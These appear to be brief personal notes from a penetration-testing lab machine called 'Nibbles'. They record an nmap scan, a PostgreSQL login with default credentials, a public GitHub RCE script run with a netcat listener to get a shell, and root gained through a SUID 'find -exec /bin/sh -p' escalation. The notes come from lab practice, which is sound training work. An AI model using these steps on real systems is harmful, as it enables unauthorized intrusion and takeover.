# Nibbles
# date 4-8-2023
# 192.168.207.47


# nmap
PORT    STATE  SERVICE      VERSION
21/tcp  open   ftp          vsftpd 3.0.3
22/tcp  open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open   http         Apache httpd 2.4.38 ((Debian))
139/tcp closed netbios-ssn
445/tcp closed microsoft-ds



└─$ psql -h 192.168.207.47 -p 5437 -U postgres
pass postgres


# Exploitation

postgreSQL python rce

https://github.com/squid22/PostgreSQL_RCE
modify exploit
└─$ python3 postgresql_rce.py
nc -lvnp 80
we got shell


# priv esc
 find / -perm -4000 -type f 2>/dev/null 

 gtfo bins >> find

 find . -exec /bin/sh -p \; -quit

 we got root
 